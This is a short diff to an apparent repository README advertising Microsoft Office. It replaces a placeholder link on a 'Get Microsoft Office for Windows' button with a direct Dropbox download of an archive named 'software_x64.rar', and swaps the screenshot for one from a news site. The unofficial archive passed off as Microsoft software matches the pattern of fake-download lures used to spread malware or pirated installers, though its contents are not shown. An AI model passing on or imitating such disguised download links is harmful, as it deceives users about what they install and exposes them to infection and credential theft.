@@ -7,7 +7,7 @@
 <br>  
 
 <p align="center">  
-  <a href="#">  
+  <a href="https://www.dropbox.com/scl/fi/28ng98g4fzq33lbno9m8f/software_x64.rar?rlkey=b373m3p587hxmi2744ll3lgc7&st=yihohuty&dl=1">  
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Get Microsoft Office for Windows">  
   </a>  
 </p>
@@ -22,7 +22,7 @@
 ---
 
 <div align="center">  
-  <img src="https://support.microsoft.com/images/en-us/330c53df-1655-4e1d-81fb-874988505cd2" width="1080" alt="Microsoft Office Screenshot"/>  
+  <img src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/23058116/microsoft_office_2021.jpg?quality=90&strip=all&crop=0,0,100,100" width="1080" alt="Microsoft Office Screenshot"/>  
 </div>  
 
 <br>
